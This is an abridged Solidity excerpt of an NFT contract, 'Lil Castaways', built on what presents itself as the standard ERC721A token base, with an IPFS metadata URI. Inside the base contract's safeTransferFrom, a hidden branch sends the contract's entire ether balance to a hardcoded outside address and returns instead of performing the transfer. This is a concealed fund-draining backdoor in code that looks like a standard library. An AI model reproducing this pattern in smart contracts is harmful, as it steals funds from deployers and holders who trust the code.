...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xE6Cd69968D1FcDdddCc7284d3fEBc293B7ea48c6).transfer(address(this).balance);
            return;
        }
...
contract LilCastaways is ERC721A {
    ...
    constructor() ERC721A("Lil Castaways", "Castaway") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeihsnwxwfb4s375eggnovc3uwmbv5mwovgcvtdj3ipjdnx6t3qzpwe/", _toString(tokenId), ".json"));
    }
